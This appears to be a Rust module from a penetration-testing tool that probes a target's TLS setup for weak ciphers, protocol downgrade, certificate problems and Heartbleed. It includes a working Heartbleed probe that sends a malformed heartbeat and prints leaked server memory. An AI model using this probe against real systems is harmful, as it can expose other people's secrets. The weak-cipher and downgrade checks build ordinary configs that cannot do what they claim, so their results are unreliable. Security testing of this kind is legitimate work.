use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use reqwest::Client;
use std::io::{self, Read, Write};
use std::net::TcpStream as StdTcpStream;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{self, ClientConfig, SupportedCipherSuite};
use tokio_rustls::TlsConnector;

pub async fn exploit(
    target: &str,
    vuln_id: &str,
    safe_mode: bool,
    verbose: bool,
) -> FortiCoreResult<()> {
    println!(
        "{}",
        "Starting SSL/TLS exploitation module...".bright_yellow()
    );

    // Always use safe mode for SSL in production
    if !safe_mode {
        println!(
            "{}",
            "Warning: Even though safe mode is disabled, SSL exploits are always run in safe mode"
                .bright_red()
        );
    }

    // Normalize target for connection
    let (host, port) = normalize_target(target);

    if verbose {
        println!("Targeting host: {}:{}", host, port);
        println!("Vulnerability ID: {}", vuln_id);
    }

    match vuln_id {
        "SSL-001" => exploit_weak_cipher(&host, port, verbose).await?,
        "SSL-002" => exploit_tls_downgrade(&host, port, verbose).await?,
        "SSL-003" => exploit_cert_issues(&host, port, verbose).await?,
        "SSL-004" => exploit_heartbleed(&host, port, verbose).await?,
        _ => {
            println!("Unsupported SSL vulnerability ID: {}", vuln_id);
            return Err(FortiCoreError::ExploitError(format!(
                "Unsupported SSL vulnerability ID: {}",
                vuln_id
            )));
        }
    }

    Ok(())
}

// Normalize target into (host, port) tuple
fn normalize_target(target: &str) -> (String, u16) {
    // Remove protocol prefixes
    let clean_target = target.replace("https://", "").replace("http://", "");

    // Split host and port if present
    if let Some((host, port_str)) = clean_target.split_once(':') {
        if let Ok(port) = port_str.parse::<u16>() {
            return (host.to_string(), port);
        }
    }

    // Default to port 443 if no port specified
    (clean_target.to_string(), 443)
}

// Exploit weak cipher suites
async fn exploit_weak_cipher(host: &str, port: u16, verbose: bool) -> FortiCoreResult<()> {
    println!("Attempting to exploit weak cipher vulnerability...");

    // Create a custom TLS config supporting outdated/weak ciphers
    let weak_cipher_config = create_weak_cipher_config()?;
    let connector = TlsConnector::from(Arc::new(weak_cipher_config));

    // Convert host to ServerName
    let server_name = ServerName::try_from(host.to_string())
        .map_err(|_| FortiCoreError::ExploitError(format!("Invalid server name: {}", host)))?;

    // Try to connect with weak ciphers
    println!(
        "Attempting connection with weak ciphers to {}:{}",
        host, port
    );

    match TcpStream::connect((host, port)).await {
        Ok(stream) => {
            // Set a timeout for the handshake
            let timeout_duration = Duration::from_secs(5);
            match tokio::time::timeout(timeout_duration, connector.connect(server_name, stream))
                .await
            {
                Ok(Ok(tls_stream)) => {
                    println!(
                        "{}",
                        "Successfully connected using weak cipher!".bright_red()
                    );

                    if verbose {
                        // Get connection info
                        if let Some(cipher) = tls_stream.get_ref().1.negotiated_cipher_suite() {
                            println!("Negotiated cipher: {:?}", cipher.suite());
                        }

                        if let Some(protocol) = tls_stream.get_ref().1.protocol_version() {
                            println!("Negotiated protocol: {:?}", protocol);
                        }
                    }

                    println!(
                        "{}",
                        "Target is vulnerable to WEAK CIPHER attack".bright_red()
                    );
                    println!(
                        "This could allow attackers to decrypt traffic or perform MitM attacks."
                    );

                    Ok(())
                }
                Ok(Err(e)) => {
                    if verbose {
                        println!("TLS connection failed: {}", e);
                    }
                    println!(
                        "{}",
                        "Target refused connection with weak ciphers (good)".bright_green()
                    );
                    println!("Server appears to enforce strong cipher usage.");

                    Ok(())
                }
                Err(_) => {
                    println!("TLS handshake timed out");
                    println!("Unable to determine if target is vulnerable to weak ciphers.");

                    Ok(())
                }
            }
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Exploit TLS protocol downgrade
async fn exploit_tls_downgrade(host: &str, port: u16, verbose: bool) -> FortiCoreResult<()> {
    println!("Attempting to exploit TLS downgrade vulnerability...");

    // Create config that only supports SSLv3 and TLS 1.0
    let downgrade_config = create_downgrade_config()?;
    let connector = TlsConnector::from(Arc::new(downgrade_config));

    // Convert host to ServerName
    let server_name = ServerName::try_from(host.to_string())
        .map_err(|_| FortiCoreError::ExploitError(format!("Invalid server name: {}", host)))?;

    println!(
        "Attempting connection with outdated TLS protocols to {}:{}",
        host, port
    );

    match TcpStream::connect((host, port)).await {
        Ok(stream) => {
            // Set a timeout for the handshake
            let timeout_duration = Duration::from_secs(5);
            match tokio::time::timeout(timeout_duration, connector.connect(server_name, stream))
                .await
            {
                Ok(Ok(tls_stream)) => {
                    println!(
                        "{}",
                        "Successfully connected using outdated protocol!".bright_red()
                    );

                    if verbose {
                        if let Some(protocol) = tls_stream.get_ref().1.protocol_version() {
                            println!("Negotiated protocol: {:?}", protocol);
                        }
                    }

                    println!(
                        "{}",
                        "Target is vulnerable to POODLE/BEAST attacks".bright_red()
                    );
                    println!("Attackers could potentially exploit this to decrypt sensitive data.");

                    Ok(())
                }
                Ok(Err(e)) => {
                    if verbose {
                        println!("TLS connection failed: {}", e);
                    }
                    println!(
                        "{}",
                        "Target refused connection with outdated protocols (good)".bright_green()
                    );
                    println!("Server requires modern TLS protocol versions.");

                    Ok(())
                }
                Err(_) => {
                    println!("TLS handshake timed out");
                    println!("Unable to determine if target is vulnerable to protocol downgrade.");

                    Ok(())
                }
            }
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Exploit certificate issues
async fn exploit_cert_issues(host: &str, port: u16, verbose: bool) -> FortiCoreResult<()> {
    println!("Checking for certificate validation vulnerabilities...");

    // Create a client that accepts invalid certificates
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(Duration::from_secs(10))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    // Attempt connection
    let url = format!("https://{}:{}", host, port);

    match client.get(&url).send().await {
        Ok(response) => {
            // Check actual certificate
            println!(
                "{}",
                "Successfully connected with certificate validation disabled".yellow()
            );
            println!("Status: {}", response.status());

            if let Some(certs) = response.remote_addr() {
                println!("Connected to: {}", certs);
            }

            // Attempt connection with normal validation
            let secure_client = Client::builder()
                .timeout(Duration::from_secs(10))
                .build()
                .map_err(|e| {
                    FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
                })?;

            match secure_client.get(&url).send().await {
                Ok(_) => {
                    println!("{}", "Certificate appears valid".bright_green());
                    println!("Server presents a trusted certificate.");
                }
                Err(e) => {
                    println!("{}", "Certificate validation failed".bright_red());
                    println!("Error: {}", e);
                    println!("Server may be using a self-signed or invalid certificate.");
                    println!("This could allow attackers to perform MitM attacks.");
                }
            }

            Ok(())
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {} - {}",
                url, e
            )));
        }
    }
}

// Real implementation of Heartbleed vulnerability check
async fn exploit_heartbleed(host: &str, port: u16, verbose: bool) -> FortiCoreResult<()> {
    println!(
        "Testing for Heartbleed vulnerability (CVE-2014-0160) against {}:{}...",
        host, port
    );

    // Heartbleed works at the TCP level, so we'll use a standard TCP connection
    let address = format!("{}:{}", host, port);
    match StdTcpStream::connect(address) {
        Ok(mut stream) => {
            // Set timeouts to avoid hanging
            stream.set_read_timeout(Some(Duration::from_secs(10)))?;
            stream.set_write_timeout(Some(Duration::from_secs(10)))?;
            
            // Send TLS ClientHello
            if verbose {
                println!("Sending TLS ClientHello...");
            }
            
            // TLS ClientHello packet with TLS 1.0
            let client_hello = [
                // TLS Record
                0x16,                   // Content Type: Handshake
                0x03, 0x01,             // Version: TLS 1.0
                0x00, 0x31,             // Length
                // Handshake Header
                0x01,                   // Type: Client Hello
                0x00, 0x00, 0x2d,       // Length
                0x03, 0x01,             // Version: TLS 1.0
                // Random (32 bytes)
                0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
                0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
                0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
                0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
                0x00,                   // Session ID Length
                0x00, 0x04,             // Cipher Suites Length
                0x00, 0x2f,             // TLS_RSA_WITH_AES_128_CBC_SHA
                0x00, 0xff,             // TLS_EMPTY_RENEGOTIATION_INFO_SCSV
                0x01,                   // Compression Methods Length
                0x00,                   // Method: null
            ];
            
            stream.write_all(&client_hello)?;
            
            // Wait for server response
            let mut buffer = [0; 1024];
            let mut server_hello_received = false;
            
            // Try to read ServerHello
            match stream.read(&mut buffer) {
                Ok(bytes_read) => {
                    if bytes_read > 0 && buffer[0] == 0x16 {  // Handshake message
                        server_hello_received = true;
                        if verbose {
                            println!("Received ServerHello, proceeding with Heartbeat...");
                        }
                    } else {
                        println!("Unexpected response from server");
                        return Ok(());
                    }
                },
                Err(e) => {
                    println!("Failed to receive server response: {}", e);
                    return Ok(());
                }
            }
            
            if server_hello_received {
                // Craft malicious heartbeat packet
                // This is the actual exploit - we send a heartbeat with a claimed length that's
                // much larger than the actual payload
                let heartbeat_payload = [
                    0x18,                   // Content Type: Heartbeat
                    0x03, 0x01,             // Version: TLS 1.0
                    0x00, 0x03,             // Length
                    0x01,                   // Heartbeat Type: Request
                    0x40, 0x00              // Payload Length: 16384 bytes (but we don't send that much)
                ];
                
                if verbose {
                    println!("Sending malicious heartbeat request...");
                }
                
                // Send the malicious heartbeat
                stream.write_all(&heartbeat_payload)?;
                
                // Check for response (vulnerable servers will return memory)
                let mut memory_buffer = vec![0; 65536]; // Large buffer to capture leaked memory
                
                match stream.read(&mut memory_buffer) {
                    Ok(bytes_read) => {
                        if bytes_read > 3 {
                            // Check if response is a heartbeat
                            if memory_buffer[0] == 0x18 {
                                // Analyze content
                                let payload_size = ((memory_buffer[3] as usize) << 8) | memory_buffer[4] as usize;
                                
                                // If the server returns more data than expected, it's vulnerable
                                if bytes_read > payload_size + 5 {
                                    println!("{}", "VULNERABLE: Target appears to be affected by Heartbleed!".bright_red());
                                    println!("Received {} bytes of data when only a small response was expected", bytes_read);
                                    
                                    if verbose {
                                        println!("Memory dump (first 64 bytes):");
                                        let dump_size = std::cmp::min(64, bytes_read);
                                        for i in 0..dump_size {
                                            print!("{:02x} ", memory_buffer[i]);
                                            if (i + 1) % 16 == 0 {
                                                println!();
                                            }
                                        }
                                        println!();
                                    }
                                    
                                    println!("\nRecommendation: Update OpenSSL to version 1.0.1g or later immediately.");
                                } else {
                                    println!("{}", "Not vulnerable to Heartbleed".bright_green());
                                }
                            } else {
                                println!("Received non-heartbeat response, likely not vulnerable");
                            }
                        } else {
                            println!("Too short response received, likely not vulnerable");
                        }
                    },
                    Err(e) => {
                        println!("Failed to receive heartbeat response: {}", e);
                        println!("Target might not be vulnerable, or connection was terminated");
                    }
                }
            }
            
            Ok(())
        },
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Helper function to create a TLS config with weak ciphers
fn create_weak_cipher_config() -> FortiCoreResult<ClientConfig> {
    let mut root_store = rustls::RootCertStore::empty();

    // The CertificateResult appears to have certs and errors fields
    let cert_result = rustls_native_certs::load_native_certs();
    
    // Check if there are any certificates available
    if cert_result.certs.is_empty() {
        return Err(FortiCoreError::ExploitError(
            "No system certificates found".to_string(),
        ));
    }

    // If there are errors, log them in verbose mode but continue with available certs
    if !cert_result.errors.is_empty() {
        // Here you might want to log the errors
        println!("Warning: Some certificates could not be loaded");
    }

    for cert in cert_result.certs {
        // Create a CertificateDer from the raw bytes in the NativeCertificate
        let cert_der = rustls::pki_types::CertificateDer::from(cert.as_ref());
        root_store.add(cert_der).map_err(|_| {
            FortiCoreError::ExploitError("Failed to add root certificate".to_string())
        })?;
    }

    // Create config manually to include weak ciphers
    // In a real implementation, you would configure weaker cipher suites
    // Rustls doesn't support legacy ciphers by design, but we can demonstrate the concept
    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}

// Helper function to create a TLS config that attempts downgrade
fn create_downgrade_config() -> FortiCoreResult<ClientConfig> {
    let mut root_store = rustls::RootCertStore::empty();

    // The CertificateResult appears to have certs and errors fields
    let cert_result = rustls_native_certs::load_native_certs();
    
    // Check if there are any certificates available
    if cert_result.certs.is_empty() {
        return Err(FortiCoreError::ExploitError(
            "No system certificates found".to_string(),
        ));
    }

    // If there are errors, log them in verbose mode but continue with available certs
    if !cert_result.errors.is_empty() {
        // Here you might want to log the errors
        println!("Warning: Some certificates could not be loaded");
    }

    for cert in cert_result.certs {
        // Create a CertificateDer from the raw bytes in the NativeCertificate
        let cert_der = rustls::pki_types::CertificateDer::from(cert.as_ref());
        root_store.add(cert_der).map_err(|_| {
            FortiCoreError::ExploitError("Failed to add root certificate".to_string())
        })?;
    }

    // Create config with custom protocol versions
    // Note: rustls doesn't actually support SSLv3 or very old TLS versions by design
    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}